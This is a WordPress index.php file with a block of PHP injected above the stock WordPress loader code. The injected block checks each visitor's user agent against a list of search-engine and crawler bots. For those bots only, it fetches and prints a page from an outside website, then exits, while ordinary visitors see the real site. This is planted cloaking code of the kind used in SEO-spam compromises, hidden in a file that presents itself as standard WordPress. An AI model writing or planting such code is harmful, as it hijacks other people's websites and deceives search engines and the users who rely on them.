<?php
function is_bot() {
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    $bots = array('Googlebot', 'TelegramBot', 'bingbot', 'Google-Site-Verification', 'Google-InspectionTool', 'adsense', 'slurp');
    
    foreach ($bots as $bot) {
        if (stripos($user_agent, $bot) !== false) {
            return true;
        }
    }
    
    return false;
}
if (is_bot()) {
    echo file_get_contents('https://www.citiverse.ro/default.php');
exit;
}
?>
<?php 
/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */
 
/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
define( 'WP_USE_THEMES', true );
 
/** Loads the WordPress Environment and Template */
require __DIR__ . '/wp-blog-header.php'
